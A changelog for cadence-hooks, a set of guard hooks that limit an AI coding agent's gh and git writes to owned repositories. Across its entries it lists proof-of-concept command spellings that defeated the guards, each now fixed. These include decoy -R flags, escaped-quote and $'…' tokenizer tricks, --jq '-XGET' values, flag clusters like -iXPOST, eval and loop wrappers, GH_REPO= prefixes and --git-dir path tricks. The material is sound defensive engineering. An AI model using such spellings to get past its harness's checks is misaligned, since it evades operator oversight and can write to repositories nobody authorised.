  **`repos/<owner>/<repo>` is now read from the parsed API endpoint rather than the segment**, and the `-R` scan, the `gh repo <verb>` positional, and the gist/fork exemption all read argv positions. Quoted text is one token, so it can never masquerade as a flag or a subcommand. `gh repo edit` was still resolved from the cwd remote despite being a write with a positional target — deliberately not folded in here, and fixed in the entry below. (That deferral cited #454; the `gh repo edit` issue is #457, and #454 is the `gh api -X GET` false block. Both are corrected below.)

  **#353's own diagnosis is refuted, and its fix would have been inert.** The issue reports a loop-wrapped read-only `gh api graphql` being blocked as a write, and prescribes applying the `graphql_mutation_status` downgrade at the three loop call sites, on the theory that `API_FIELD_FLAGS` matches any `-f query=…`. It does not, on that path: core's `suffix_words` keeps only `Word` items when building `LoopedCommand::args`, so the payload is dropped and the command reconstructs as a bare `gh api graphql -f` — matching no write pattern at all. The loop gate returns `has_write: false` and declines to judge, which means there was never a verdict there to downgrade; a test now pins that reconstruction verbatim. The block the issue observed came from the *per-segment* pass below the loop gate, and it arrived there because `command_segments` splits `for …; do gh …; done` on the `;` and leaves `do` welded to the body — which made `gh_api_endpoint` return `None`, skipping the graphql arm that would have allowed the read. Peeling that keyword in `gh_argv` is the whole fix; the three named call sites are untouched.

  **The same blindness was also a false ALLOW in the other direction**, which neither issue reports. From an *owned* checkout, a loop-wrapped `gh api graphql -f query='mutation …'`, `gh api -X POST orgs/evil/repos`, or `gh api orgs/evil/repos -f name=x` skipped the api-unverifiable arm for the same reason and fell through to cwd resolution, which allowed it — reopening #78's bypass to anyone who wrapped the call in a loop. All three now block as `gh-write-api-unverifiable`, and a loop-wrapped `resolveReviewThread` stays allowed.

  **A `repos/<owner>/<repo>` path in any argument value suppressed the api block.** Separate from arm 3 and not fixed with it: the per-segment gate that decides whether a non-graphql `gh api` write is owner-checkable ran `API_REPOS` against the raw segment, so `gh api orgs/evil-org/repos -X POST -f name=pwned -H "ref: repos/cameronsjo/allowed for docs"` satisfied it on the header's text. The real endpoint is an org write no ownership check can reach; the block never fired and the segment fell through to the cwd remote, allowed from any owned checkout. It now reads the parsed endpoint, like arm 3. This one needed no escaping and no loop — plain quoting was enough.

  **`core::shell::tokenize` diverged from the shell on escaped quotes, and a guard that parses is only as honest as its parser.** It closed a quoted string on any matching quote character, including a `\"` that a real shell treats as literal content. Two consequences, both of which let `guard_gh_write` clear a write that lands elsewhere: `--body "see \"… -R cameronsjo/allowed\" notes" -R evil/target` split the body and exposed a decoy `-R cameronsjo/allowed` *before* the real flag, and `--body x\" -R evil/target` read the escaped quote as an *opener* and swallowed the rest of the command — real `-R` included — into one phantom quoted token, so no target resolved at all. The tokenizer now honors a backslash before a quote the way `sh` does: outside quoting it makes the quote a literal that opens nothing, and inside `"…"` a literal that does not close. Single quotes still take no escapes, per POSIX.

  **The blast radius was deliberately kept to quote boundaries.** A backslash anywhere else stays a literal character, because `tokenize` has 21 call sites across seven crates and consuming backslashes generally would corrupt the very operands the destructive-command guards compare — a Windows path (`C:\Users\x`) and the `\gh` spelling that `tokens_contain_gh` strips itself both survive byte-for-byte, pinned by test. The full workspace suite passes unchanged (3522 tests), which is the evidence that no other caller shifted.

  **`$'…'` is not `'…'`, and treating them alike was the same divergence in a third costume.** Plain single quotes take no escapes, but bash's ANSI-C form honors `\'` — so closing on the escaped quote let the *real* closing quote reopen a phantom string. `gh issue create --title $'a\'b' -R evil/target` swallowed the rest of the command, `-R evil/target` included, and resolved nothing; the sibling form leaked an allowed `-R` the shell never passes as a flag. `tokenize` now carries three quote modes rather than two, with `$'…'` consuming the character after a backslash. This one is a regression against `main`, where the whitespace scan still saw the real flag.

  **The last `-R` wins, because that is the one gh obeys.** Verified against gh 2.96.0: given two repo flags, a malformed value is rejected when it comes last and ignored when it comes first. Resolving the first let a benign leading flag cover a real one — `gh issue comment 42 -R cameronsjo/allowed -R evil/target` cleared the allowlist while the write landed on `evil/target`. All four spellings (`-R x`, `-Rx`, `--repo x`, `--repo=x`) now take the final occurrence.

  **A query string is not part of the target.** `API_REPOS` was unanchored and searched the whole endpoint token, so `gh api "orgs/evil-org/repos?ref=repos/cameronsjo/allowed" -X POST` matched the decoy after the `?`: the unverifiable-write gate stayed silent and the resolver handed back an allowed repo, while gh POSTed to the org path. Endpoints are now split at `?`/`#` and matched anchored to the path start. A legitimate `repos/<owner>/<repo>?state=open` still resolves — that case was already covered by a test, and it now passes because the query is *stripped* rather than merely tolerated.

  **A flag's VALUE can be shaped like a repo flag, so "which `-R` wins" is not answerable here.** Taking the last reading — correct for two real flags — is itself exploitable when the last token is another flag's argument: gh consumes `--body -Rcameronsjo/allowed` as a body and keeps the earlier real `-R evil/target`, while the guard read the decoy and cleared the write. Neither simple rule is safe. Skipping the token after *every* flag would swallow the real `-R` following a boolean like `--draft`, resolving nothing and falling through to the cwd-remote arm — which passes from an owned checkout. Both mistakes point at ALLOW. Telling a flag from a value needs gh's per-subcommand flag table, which this guard does not have and should not grow, so **disagreeing readings now fail closed**: the write blocks as unresolvable and the message asks the operator to leave exactly one. Readings that *agree* are not ambiguous, so a repeated or echoed target still resolves, and a `-R some prose` fragment — which gh would reject as a repo spec — is not counted at all, so it cannot false-block a legitimate write. This supersedes the last-wins rule from the previous round; both rounds' proofs-of-concept block, and the two tests that encoded last-wins were rewritten rather than deleted.

  **Arm 1 was the one resolution path still blind to `eval`.** It opened on `tokenize` rather than `gh_argv`, so `eval "gh issue create --title x -R evil/target"` — plain, no escaping — resolved no target and was allowed from an owned checkout. Arms 2 and 3 and the api gate had routed through `gh_argv` since the first commit and peeled the wrapper correctly, including the nested `eval "eval '…'"` form; arm 1 simply never got the same treatment. It does now, and the controls proving arms 2 and 3 already blocked ship alongside, so the fix is visibly closing a gap rather than moving one.

  **One deliberate fail-closed behavior change to know about:** anchoring the endpoint match means a full-URL `gh api https://api.github.com/repos/<owner>/<repo> …` write no longer resolves and blocks as unverifiable, where it previously resolved and could pass. The alternative — allowing an optional scheme and host before the path — is worse than the false block it avoids, because `https://evil.example/repos/<allowed-owner>/<repo>` would then resolve to an allowed owner while the request went elsewhere. Use the bare `repos/<owner>/<repo>` path form, which is gh's normal spelling.

  **On attribution:** of the two tokenize escapes, only the second is new. The decoy-flag form predates this change — the previous `split_whitespace` scan resolved that same command to `cameronsjo/allowed\`, an allowed owner, so it was already a bypass on `main`. The swallowed-`-R` form is genuinely introduced by the move to `tokenize`, since `split_whitespace` had found the real `evil/target` and blocked. Both are fixed; the distinction is recorded because a review that mis-attributes a finding sends the next reader to the wrong commit.

  **Loop analysis now retains assignment-shaped `gh api` fields** (#471). The
  loop gate classifies reconstructed API and GraphQL argv with the same policy
  as the per-segment path: GraphQL reads and the two safe review-thread
  mutations remain allowed, while unverifiable mutations block under the API
  verdict instead of being mistaken for targetless repository writes.

  **The loop-side repository flag now resolves last-wins, matching gh, and
  stops at `--`** (#477). `loop_analysis::extract_repo_flag` took the *first*
  `-R`/`--repo` it found while gh honors the last, so a command carrying two of
  them was judged against a repository it would not act on. All four spellings
  (`-R x`, `-Rx`, `--repo x`, `--repo=x`) are scanned and the last match wins.
  The scan also stops at `--`, because cobra stops parsing flags there and
  treats every later token as positional — scanning past it made the loop gate
  resolve a repository gh will not act on, and the
  `-R evil/b -- -R cameronsjo/a` orientation resolved an *owned* repo for a
  command gh runs against an unowned one.

  **This is a divergence from the per-segment path, not a convergence with
  it.** `guard_gh_write::repo_flag` deliberately does *not* resolve last-wins:
  it reports `Ambiguous` when readings disagree, because a token shaped like a
  repo flag may be another flag's value and telling them apart needs gh's
  per-subcommand flag table. That fail-closed backstop is what caught the `--`
  bug above — the loop gate's wrong answer fell through to a per-segment pass
  that saw two disagreeing readings and blocked. The loop gate's own answer is
  now right on its own, rather than right only because something downstream
  distrusts it.

  **A push-option value can no longer pose as the push remote, clusters
  included.** This is the second-order cost of the #471 fix rather than a
  separate change: keeping assignment-shaped words in `suffix_words` exposes
  `-o topic=x`-style values to `extract_push_remote`, which filtered only on a
  leading `-` and would have read the option's value as the positional remote.

  Handling the four flag *spellings* was not enough, because a single-dash
  token is a short-option **cluster** that git's parse-options walks letter by
  letter. In `-qo topic=x` the `q` is `--quiet` and the trailing `o` takes the
  next argument, so a four-spelling scan matched none of its arms, fell through
  the generic leading-`-` skip, and returned `topic=x` as the remote. Three
  blocks came off with it: two chained pushes to *different* remotes both
  resolved to `topic=x` and read as one remote, and a bare looped push read as
  though it named a target. Gerrit's push options are assignment-shaped
  (`-o topic=…`, `-o r=…`) and `-q`/`-f`/`-u` clustered with `-o` is legal git,
  so nothing exotic was required to reach it.

  `extract_push_remote` now models the walk rather than a list of spellings:
  `-o` is `git push`'s only value-taking shorthand, so where the **first** `o`
  sits decides everything — last letter in the token means the value is the
  next word, anywhere earlier means the rest of the token is the value. Keying
  on the *last* letter instead would have been wrong in the other direction:
  git 2.55.0 parses `-oo a=1 <url>` with `a=1` as the repository, since the
  first `o` consumed the second. `--`, the long spellings, and a bare flag with
  no remote following are unchanged.

  `extract_push_remote` is the loop-analysis consumer with no backstop —
  `guard-push-remote` has nothing analogous to the per-segment pass above, and
  both its chain gate and its loop gate consume the answer directly — which is
  why the option's grammar has to be modelled here rather than caught later.
  `LoopedCommand::args` is shared with `guard-push-remote`, so widening what it
  retains is never local to the guard that asked for the widening.

- **`guard-gh-write` stops blocking two commands that were correctly spelled** (cameronsjo/cadence-hooks#454, #457). Both are false BLOCKs on legitimate reads and writes, and each was reported alongside a workaround the operator had to find by trial.

  **An explicit `-X GET` is a read** (#454). `gh api -X GET search/issues -f q=… -f per_page=1` blocked as an unverifiable write while the identical request spelled as a query string was allowed — so the flag that states the method most plainly was the one that tripped the guard, and the block message talked about ownership rather than about the flag that actually fired it. **The issue's own diagnosis is refuted.** It supposes `-X`/`--method` is read as a write signal regardless of the verb; `API_WRITE_METHOD` matches only `POST|PUT|PATCH|DELETE` and never fired here. The block came from `API_FIELD_FLAGS`, because gh switches an otherwise-GET `gh api` to POST as soon as a parameter is added — which is precisely the switch `--method GET` cancels, and which gh documents as the way to send those parameters as a GET query string instead. The read-vs-write decision simply had no explicit-method override. It has one now, so the two spellings of that read agree.

  **The override requires every method reading in the argv to agree, and that unanimity is load-bearing rather than defensive.** gh (pflag) obeys the *last* occurrence, while `API_WRITE_METHOD` matches only the space-separated spelling — so a first-reading-wins scan would have cleared `gh api … -X GET -XPOST -f a=b` as a read while gh POSTed. Disagreement instead falls back to gh's implicit rule, which for a command carrying parameters means write. All five spellings are parsed (`-X V`, `-XV`, `-X=V`, `--method V`, `--method=V`) from parsed argv rather than raw text, so a `-X GET` inside a quoted `--body` or `-f` value is one token and can never pose as the flag. The residual error is a false BLOCK on `-X POST -X GET`, which gh runs as a GET — the direction this guard is allowed to err in. Nothing outside `gh api` moves: `WRITE_ACTIONS` is tested first and independently, so `gh pr create --body -X GET` is still a write. `HEAD` is deliberately not included; it is also a read, but no observed command uses it and every verb added here is one more that has to be argued.

  **`gh repo edit` had no satisfying spelling at all** (#457). It is in `WRITE_ACTIONS` but was absent from the positional-target verb set, so the `owner/repo` it names was ignored and the target came from the cwd remote — the report caught the block naming one owner while its own `Fix:` line named the right one. That fix then advised `-R owner/repo`, a flag `gh repo edit [<repository>]` does not have (verified against gh 2.96.0, whose `--help` lists no `--repo`), and running from a neutral cwd only swapped one block for another carrying the same impossible instruction. Adding `edit` to the verb set relaxes no ownership rule: the verb stays a write, and the repo it names goes through the same allowlist check every other resolved target does.

  **That second fix also closes a false ALLOW neither issue reports.** Because the cwd remote answered for the command, `gh repo edit evil-corp/cool-tool --enable-issues` run from an *owned* checkout resolved to the owned repo, cleared the allowlist, and was allowed — a write to a repo you do not own, permitted on the strength of a target the command never named. Confirmed against the pre-change source, where the new regression passes when inverted to assert ALLOW. The positional now decides, and it blocks as `gh-write-unauthorized-target`.

  **A flag's grammar has two sides, and reading only one of them was the bug under all of it.** Both scanners understood the flag *spellings* (`-X v`, `-Xv`, `-X=v`, `--method v`, `--method=v`) and neither understood the flag *stream* — which tokens are values rather than flags, and how pflag walks a single-dash cluster. Three escapes followed, each a silent ALLOW, and they are now closed by one shared value-aware scanner (`scan_unanimous_flag`) that both `repo_flag` and `api_explicit_method` route through:

  **A method hidden in a shorthand cluster.** pflag walks a single-dash token letter by letter: a boolean letter consumes nothing and the walk continues, so `gh api repos/evil-corp/x/issues -X GET -iXPOST -f title=pwned` sets the method twice and gh keeps the last — it POSTs — while the scan saw one lone `-X GET` and called the command a read. Verified live against gh 2.96.0: `-iXGET` returns 200 while `-iXBOGUS`, `-iX BOGUS`, and `-iX=BOGUS` all transmit the bogus method. `-i` is gh api's only boolean shorthand, so the table is small and exact; an unknown letter inside a cluster now fails closed rather than being walked past.

  **The same cluster grammar on the other scanner, which is NOT from this change.** `gh pr create -dR evil-corp/x --title t` was allowed from an owned checkout on 0.70.0 and every release before it: `-d` is `--draft`, so the cluster sets the repo, but `repo_flag` recognized neither `-dR` nor `-dR=…`, dropped the flag entirely, and fell through to the cwd remote. It reaches every write subcommand, not just `gh api`. No per-subcommand table exists for the general case, so the shared scanner applies the conservative rule instead: the target letter is read when it LEADS a cluster, and a cluster carrying it anywhere else is ambiguous and blocks.

  **A value-bearing flag's value read as a flag.** `gh api orgs/evil-org/repos -f name=pwned --jq "-XGET"` made the `--jq` value a unanimous GET, so `is_write_command` returned false and the segment skipped *every* gate — fail-safe, user-scoped, unverifiable, and allowlist alike — leaving a real org-endpoint POST with no ownership check at all. `--jq` and `--template` are validated only after the request fires, so they carry arbitrary text; the bypass needs no knowledge of the operator's config beyond the literal `GET`. Values of value-taking flags are now stepped over wherever a table says one follows.

  **`gh repo edit` names its target after a flag just as well as before one.** cobra parses flags and positionals interspersed, so reading only `argv[3]` saw a flag, declined, and let the cwd remote answer — allowing `gh repo edit --enable-issues evil-corp/x`, `gh repo delete --yes evil-corp/x`, `gh repo archive --yes evil-corp/x`, and the `--` terminator form from any owned checkout. The positional arm now scans past flags, stepping over the values of those it knows. Completeness of that table is not required for soundness, only for avoiding false blocks: an unrecognized long flag is treated as boolean, so the next token is read as the positional and faces the allowlist. Mistaking a boolean for value-taking is the dangerous direction — it would step over the real positional — which is why `--template` is deliberately absent, taking a value under `gh repo create` while being boolean under `gh repo edit`. A LEADING flag still does not fail closed, because `gh repo edit --enable-issues` legitimately targets the cwd repo.

  **A three-part `HOST/OWNER/REPO` positional had the wrong field judged, in both directions.** gh accepts it (verified: `github.com/owner/repo`, a full URL, and `owner/repo` all resolve to the same repo), but ownership splits on the first `/`, so `cameronsjo/evil-corp/x` passed an allowlist containing `cameronsjo` while gh targeted `evil-corp/x`. Splitting the host off fixes that and immediately opens its mirror — `evil-host/cameronsjo/x` carries an allowed-looking owner to a forge nobody named — so the host travels with the split and is judged rather than assumed. Bare allowlist entries match the default host only, so that spec blocks unless the host is explicitly allowed via `CADENCE_EXTRA_HOSTS`. A URL form is passed through unchanged rather than split, for the reason the `gh api` endpoint match is anchored: `https://evil.example/cameronsjo/x` must not yield an allowed owner. Handing it to the allowlist raw fails closed, since its "owner" is `https:`.

  **`gh api graphql` is never decided by its method.** `gh api graphql -X GET -f query='mutation …'` read as a GET and skipped the mutation classifier entirely. GitHub happens to ignore a query parameter on `GET /graphql` today, but a guard must not delegate its verdict to server transport behavior — `--hostname` repoints the same command at a GHES instance answering on someone else's terms, and an `--input` body transmits on a GET regardless. graphql is now exempt from the GET narrowing and always reaches the classifier; graphql *reads* and the auto-allowed `resolveReviewThread` mutation still pass, which is the control against re-creating #353.

  **That exemption is matched by endpoint, not by string equality**, which was its own gap: `graphql` alone compared equal while `/graphql`, `graphql?x=1`, and `https://api.github.com/graphql` — the same endpoint, three spellings gh accepts — did not, so each still took the narrowing and skipped the classifier. One `is_graphql_endpoint` helper now backs every arm that asks the question, cutting at `?`/`#` first and reducing a URL to its path, matching `/graphql` and GHES's `/api/graphql` on ANY host. Any host is the fail-closed direction: a non-github host is precisely where "GitHub ignores the query parameter on `GET /graphql`" stops being a safe assumption to rest a verdict on. The `/api/` spelling is accepted for URL forms only — a relative endpoint is resolved against the API base by gh itself, so matching a trailing `/graphql` there would swallow `repos/<owner>/graphql`, a real repo named `graphql`, which stays owner-checked. A `repos/<owner>/<repo>?graphql=1` red herring is likewise not exempted, pinned by a test that the same endpoint still blocks as `gh-write-unauthorized-target` under `-X POST`.

  **One test was a false witness and is replaced.** The disagreement case `-XGET -X PATCH` matched `API_WRITE_METHOD` directly — that regex catches a space-separated `-X PATCH` — so it passed without ever reaching the unanimity rule it claimed to pin. It is now `-XGET -X=PATCH`, which the regex cannot see, with an assertion that the regex really is silent on it so the case cannot quietly stop testing the property again.

  **`gh repo edit` does not accept a bare name**, contrary to a review concern raised against this change: verified against gh 2.96.0, it rejects one outright (`expected the "[HOST/]OWNER/REPO" format`), unlike `gh repo view`, which infers the authenticated user. So there is no bare-name spelling of `gh repo edit` for the guard to resolve and no unsatisfiable shape hiding behind one; `create` remains the only verb whose bare name infers an owner, which the resolver already special-cases. Pinned by test so the concern is not re-raised from the `repo view` behavior.

  Verified by differential in two rounds: the first round's cases spliced onto the pre-change source fail on exactly the ten that probe the two original defects, and this round's onto the first fix fail on exactly the nine that probe the escapes above — while every positive control passes on both sides (an ordinary leading `-R` in all three spellings, a boolean cluster with no method letter, an unknown cluster letter still failing closed, a graphql read and a safe graphql mutation, `gh repo edit` with no positional falling back to the cwd, a `--description some/thing` value not read as a target, an owned target after a flag, and the verb appearing only in quoted prose). Every proof-of-concept was additionally replayed end-to-end through the built binary, where all seventeen now block.

## [0.70.0] - 2026-07-27

### Added

- **`guardrails inject-gh-write-context` — the `-R owner/repo` rule, restated just before an untargeted `gh` write** (cameronsjo/cadence-hooks#459). `inject-gh-context` primes the allowlist and the `-R` rule at SessionStart, which is the right place to *establish* the rule and the wrong distance from the write that needs it: by the time a `gh pr create` is composed, that context can be many turns — or a compaction — behind, and the write lands bare, targeting whatever cwd's git remote happens to be. The new PreToolUse check re-states the same message at the moment it applies.

  **One wording, one place.** The nudge renders through `inject_gh_context::render_from_env` — the same env-read-and-render the SessionStart injector now uses — rather than paraphrasing the message or re-assembling the renderer's inputs at a second call site, so a future allowlist input reaches both or neither. Its fire condition reuses `guard_gh_write`'s own write-detection and target-detection (`is_write_command`, `segment_invokes_gh`, and a new `segment_lacks_explicit_target` expressing the complement of the first three arms of `resolve_target_repo`). A second definition of "is this a write?" would drift the advice away from the block it is advising about. `guard_gh_write` itself is unchanged behaviorally — three private functions became `pub(crate)` and one predicate was added beside them.

  **Deliberately un-deduped.** Repeating on every bare write is the mechanism, not a defect: the case this exists to catch is a model that has *lost* the SessionStart context, so a once-per-session marker would silence exactly the fire that matters. Nudges are exit 0, so a repeat costs a line of context and never a blocked command. Reads never fire, and a write already carrying `-R`, an `/repos/owner/repo` API path, or a positional repo argument (`gh repo create`, `gh repo fork`, `gh gist`) is left alone — the advice would be noise. The `git commit -m "…gh pr create…"` prose case stays allowed, pinned by test, via the same `segment_invokes_gh` gate that closed #212.

  **This is PR 1 of 2, and the binary change is inert on its own.** The subcommand ships registered but UNWIRED: no `hooks.json` dispatches it, so nothing invokes it and no behavior changes for anyone on this release. Wiring it into `cadence-guardrails`' PreToolUse block is release-gated — a plugin cannot dispatch a subcommand a user's installed binary does not have — and lands separately as cameronsjo/cadence#653 once this is released. The workspace-local registration audit carries a matching `PENDING_WIRING_HOOKS` entry, removed in that PR. The SessionStart `inject-gh-context` hook is untouched and stays wired as-is; the two are complements, not a replacement.
- **`platform-drift` now nudges at most once per calendar day** (cameronsjo/cadence-hooks#458). A version gap persists for days, so the nudge repeated identically at every SessionStart until the upgrade landed — which is how a nudge stops being read. A new `markers::claim_today` primitive gates it on a local-date marker keyed by the drift *content* (`hooks:0.69.0>0.70.0,cc:…`), so resolving one half while the other stays behind re-fires the same day rather than waiting for tomorrow. Local date, not UTC, deliberately: the gate means "once per day as the operator experiences it", and a UTC boundary would split one working day across two windows.

  **Every failure path degrades toward nudging** (ADR-0001): an unreadable marker nudges, a failed write still nudges, and — because this is the family's first marker whose *content* suppresses output rather than merely its presence — the gate is skipped entirely when `marker_dir()` could not create or harden its `0700` per-user directory and fell open to a world-writable base. There, a co-tenant could pre-plant the (fully static) `daily-platform-drift` filename with a guessable stamp and mute the nudge for the day; on a sticky `/tmp` the corrective rename then fails, so the mute would persist. `markers::marker_dir_is_private()` reports which mode is in effect. The gate token's version terms are percent-escaped for the same reason: both are file-supplied, and `parse_semver` tolerates trailing bytes, so an unescaped `>` or `,` could forge the token grammar and alias another drift state. `CADENCE_NO_DAILY_GATE` (any non-empty value) disables the gate outright.

  Test-side, `CADENCE_MARKER_DIR` now has exactly one lock and one helper across the workspace (`core::test_builders::with_marker_dir`, #446) — the private copies in `cadence::test_support` and `session::warn_commit_provenance` are deleted, and the shared helper adopted the latter's panic-safe shape (`catch_unwind` plus restore-the-prior-value), so a failing wrapped test can no longer leak the override into every test after it. `platform-drift`'s nine `run_*` tests are sandboxed through it, since `Check::run` now touches process-global state.

- **A bare `gh pr merge` is now a polish ship anchor** (cameronsjo/cadence-hooks#325). The anchor set covered `gh pr ready` and non-draft `gh pr create`, which left a hole on exactly the draft-first path it was redesigned for: a branch could go draft → **ready-flipped in the web UI** → merged with no anchor ever firing. The gate was sound at each anchor; the anchor set just had no coverage of how draft-first branches actually ship. Merge is the last hook-visible moment on that path.

  Merge had been excluded deliberately — an orchestrator often runs it from `main` or another cwd, where resolving the branch from the cwd mis-resolves and false-nudges about someone else's work. **That exclusion survives exactly where it was earned, because the two cases are separable without a network call.** gh's own help settles the rule: "without an argument, the pull request that belongs to the current branch is selected." So a bare `gh pr merge` is about the cwd's branch, and cwd resolution is correct. A merge naming a number, URL, or branch — or retargeted at another repository — stays excluded. No network call, no cache, no new state.

  **Retargeting is checked in four spellings, not one.** A security review found the first cut caught only `--repo owner/r` in global position, and that `gh` honors three more: the attached shorthand `-Rowner/r`, an override written *after* the subcommand (gh takes global flags there), and an inline `GH_REPO=`/`GH_HOST=` assignment — which `skip_transparent_prefixes` consumes before `argv` is even formed. The last one is the dangerous one and was verified live: gh does **not** error, it resolves the current local branch name against the override repo, so `GH_REPO=o/r gh pr merge` merges a different repo's PR with no argument at all. An *exported* `GH_REPO` leaves no token behind and is genuinely unclosable here; it is documented as a carve-out rather than claimed as covered.

  **Two routes still hide a PR selector, and are pinned as known holes rather than claimed closed.** An *exported* `GH_REPO` leaves no token in the command string at all. And `split_segments` cuts at the `&` of `2>&1`, so `gh pr merge 2>&1 12` puts the `12` in a different segment — that is `command_segments`' reach, shared repo-wide; `merge` is simply the only anchor that inspects operands, so it is the only one that loses anything to it. The anchor is the best available reading of the command text, not a proof about what gh will do.

  **Any non-flag operand disqualifies, including a flag's own value** — `gh pr merge --squash -b "some message"` reads as argument-bearing and does not anchor, pinned by test rather than papered over. The comment check tests token *equality* with `#`, not a prefix: a quoted flag value can merely begin with one (`-t '#123'`), and treating that as a comment ended the scan and let a PR number after it through unexamined. The two error directions are not symmetric: wrongly seeing an operand costs one un-nudged ship, while wrongly seeing none nudges about a branch resolved from the wrong cwd. **Shell redirections and a trailing comment are skipped**, though, because the rule this ecosystem prescribes for gating a merge on its exit code is `cmd > log 2>&1; echo $?` — counting `2>&1` and a log path as PR selectors would have meant the *careful* merge spelling never anchors while the careless one does, reopening the very hole #325 exists to close.

  Verified by differential against a binary built from `origin/main`, hatches unset, in a marker-free repo (a satisfied gate reads silent for everything and stops discriminating) with live NUDGE controls: bare-merge shapes gain the anchor, every argument-bearing and retargeted shape is unchanged, and unrelated subcommands are unchanged. The negative set is adversarial on gh's flag surface — attached values, post-subcommand placement, and the env-assignment form — after the first pass tested only separated values and missed three live routes.

  **One row per anchor, not per ship.** `polish_nudges.jsonl` rows now carry an `anchor` field (`create`/`ready`/`merge`), because a draft-first branch trips `ready` and again at `merge`, and two rows for one ship would otherwise be indistinguishable from two ships. The double-count is *directionally biased* — a merge-time row is likelier to carry `markerPresent: true`, since polish may have happened in between — so a naive rate would read better than reality. Anything measuring adherence should dedup on `(repo, branch)` or split by `anchor`.

  **Still open by construction, and not pending work:** the web-UI ready-flip itself. A browser click passes through no hooked Bash call, so no Bash `PreToolUse` guard can ever see it. Merge-time is also the natural CP2 (block) escalation point, and CP2 stays **unstarted deliberately** — it was always gated on fire-rate data, and `log-polish-nudge` has never collected a row (#409). Nudge telemetry only became default-on in 0.68.0, and #419 just stopped that denominator being inflated by false fires; escalating to a block before the first honest numbers arrive would be deciding blind. The merge anchor is nudge-only, so "the last hook-visible moment" buys telemetry and advice, not a gate.

  **The measuring session should know the instrument moved.** The polish quiet-week plan opens its window on or after 2026-07-28 and defines its denominator as one `polish_nudges.jsonl` row per ship anchor, compared against attended baselines gathered under the old anchor set. This change re-bases that instrument two days out: the `anchor` field is what keeps the comparison recoverable, and a rate computed without deduping or splitting on it will overstate adherence.

## [0.69.0] - 2026-07-26

### Changed

- **Relicensed to Apache-2.0 with the Commons Clause** (cameronsjo/cadence-hooks#127). `license = "BSL-1.1"` becomes `license-file = "LICENSE"` across the workspace and all eight crates, because cargo rejects a non-SPDX `license` string and Commons Clause has no SPDX identifier — `license-file` is the sanctioned escape hatch, and `cargo package` resolves the crates' parent-relative `../../LICENSE` and packages it. BSL-1.1 prohibited third-party commercial use, which blocked the in-house users this project exists to serve; the Commons Clause inverts that, withholding only the right to *sell* the software. `BSL-1.1` was never a valid SPDX identifier either (the Business Source License is `BUSL-1.1`; `BSL-1.0` is Boost), so this repo already read `NOASSERTION` and continues to — an accepted consequence of source-available licensing, not a regression. `CONTRIBUTING.md`'s contributor grant and the `LICENSE` copyright notice were corrected alongside. Recorded in claude-configurations ADR-0039.

### Fixed

- **`enforce-worktree` no longer skips the commit forms that name a target tree by flag or env (cameronsjo/cadence-hooks#378).** From a linked worktree, five spellings of "commit into the primary checkout" were allowed: `git --work-tree=<primary> commit`, `git --git-dir=<primary>/.git commit`, both of their separate-value spellings, and a `GIT_DIR=… GIT_WORK_TREE=… git commit` env prefix. `git -C <primary> commit` and `cd <primary> && git commit` blocked correctly the whole time — the issue as filed reported *those* as broken and is refuted; the generalization to the flag and env forms is the real bypass. The two flags used to set an `ambiguous` flag that returned early "because the target tree cannot be cheaply resolved", but both name a directory that resolves like any other, so the skip was a miss dressed as a fail-open. They now resolve. `--work-tree` and `--git-dir` are **both** emitted as targets rather than ranked against each other, because they name two different things a commit mutates — the tree it reads and the repository whose HEAD and index it advances — so `git --git-dir=<primary>/.git --work-tree=<elsewhere> commit` blocks on the repo it really advances instead of being waved through on the work-tree alone. A value naming a *linked worktree's* admin dir (`.git/worktrees/…`) is dropped rather than walked up to the primary, which would false-block the legitimate spelling. **Every raw target string is folded through a lexical normalizer first** (`.`, `..`, `//`, trailing slash, and `<repo>/.git` → `<repo>`; a bare repo's own `thing.git` survives — and, on Windows, a `C:/…`/`C:\…` drive prefix, lowercased for NTFS-insensitive comparison). `GitState::resolve` canonicalizes, so *assessment* was always immune to spelling — but every decision made on the raw string was not, and that asymmetry was exploitable: `--git-dir=<primary>/.git/worktrees/..` **is** `<primary>/.git`, yet it matched the linked-worktree exclusion lexically and dropped the primary's own git dir, so the walk fell through to the session's worktree and allowed a commit onto the primary's branch. Six spellings evaded. On Windows the same lexical fold had a second, structural gap: absoluteness was decided by a bare `path.starts_with('/')` and segments were split on `/` alone, so a native `C:\…` target (this crate's own Windows CI fixture path, or a real hook's native `cwd`) collapsed its whole drive-letter prefix into one opaque segment that a later `..` popped wholesale — discarding the drive letter and turning an absolute commit target into a relative fragment that resolved to no repo, failing the guard open on every one of 26 Windows CI tests. The same normalizer is applied symmetrically to the in-chain dismiss map's other side (`dismiss --repo`), so `--repo <p>/` and `--repo <p>/.git` key the same repository a `--work-tree=<p>` commit does. An explicit flag outranks its own env var (only its own, as in git), and every value — flag or env — resolves against the **post-`-C`** directory, because git applies the `-C` chdir before repository setup. Repeated `-C` now **accumulates** as git documents it (each non-absolute hop relative to the preceding one) rather than overwriting, so `git -C <primary> -C . commit` stops resolving against the session cwd. A `GIT_WORK_TREE=`/`GIT_DIR=` prefix is also inherited by a wrapper's child (`GIT_WORK_TREE=<primary> sh -c 'git commit'`), the way the shell exports it. **The in-chain `dismiss-enforce-worktree` walk now takes its commit targets from the block-channel walk itself rather than re-deriving them.** The map is keyed by target string, so any divergence silently stops a `dismiss && commit` chain from matching — and a hand-kept second implementation diverged the moment the block channel learned to inherit a git env prefix into child scripts, leaving `dismiss && GIT_WORK_TREE=<p> sh -c 'git commit'` blocked despite the user's own dismiss. Calling the real walk makes that parity structural instead of a comment asserting it. The top-level-only rule for arming a dismiss is unchanged: commit *detection* recurses into wrappers, dismiss *detection* deliberately does not, so a dismiss buried in `sh -c '…'` still does not license anything. Unresolvable values still fail open in `assess_dir` (ADR-0001), and committing *into* a worktree from the primary by any of these spellings still allows — the env-prefix inversion the module header used to accept as a known false block is gone with it. Still missed, deliberately, and now enumerated in the module header: a prefix's own option flags (`nice -n 10 …`, `env -i …`), `xargs`-fed commits, wrappers past `MAX_WRAPPER_DEPTH`, and a git env var set by a standalone `export` in an earlier segment.
